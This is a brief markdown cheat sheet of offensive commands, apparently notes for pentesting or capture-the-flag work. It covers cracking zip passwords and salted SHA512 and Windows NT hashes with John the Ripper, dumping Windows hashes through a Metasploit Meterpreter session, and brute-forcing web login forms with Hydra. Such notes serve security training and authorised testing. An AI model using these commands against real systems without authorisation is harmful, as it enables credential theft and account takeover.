# Cracking Things

## Unzip password protected zip archives

```
zip2john archive.zip > archive.hash
john archive.hash --fork=4 -w=/path/to/wordlist
```

## Crack salted SHA512 hash

hashfile format: hash$salt
```sh
john --format='dynamic=sha512($p.$s)' --wordlist=/usr/share/wordlists/rockyou.txt ./hashfile
```

## Crack Windows Hash

### Metasploit
```sh
# First, open and background a Meterpreter session
# Store hash dump into database, then:
use post/windows/gather/hashdump
set session X
use auxiliary/analyze/crack_windows
run
```

### John The Ripper
```sh
# Fist, get Windows hash
# Format: User:1000:aad3b435b51404eeaad3b435b51404ee:ffb43f0de35be4d9917ac0cc8ad57f8d:::
john --format=NT --wordlist=/usr/share/wordlists/rockyou.txt hash.txt
```

## Credentials brute-forcing

### Hydra

- Bruteforce login/password combination
```
hydra -L /usr/share/wordlists/rockyou.txt -P /usr/share/wordlists/rockyou.txt <hostname> http-post-form "/path/to/login:<username field name>=^USER^&<password field name>=^PASS^:<error string>"
```
- Find password for a known user
```
hydra -P /usr/share/wordlists/rockyou.txt -l admin www.domain.tld http-post-form "/path/to/login.php:<username field name>=^USER^&<password field name>=^PASS^:<error string>"
```

## Links
___
### Guides
- https://github.com/frizb/Hydra-Cheatsheet
- https://github.com/DidierStevens/DidierStevensSuite/blob/master/xor-kpa.py

### Writeups
- 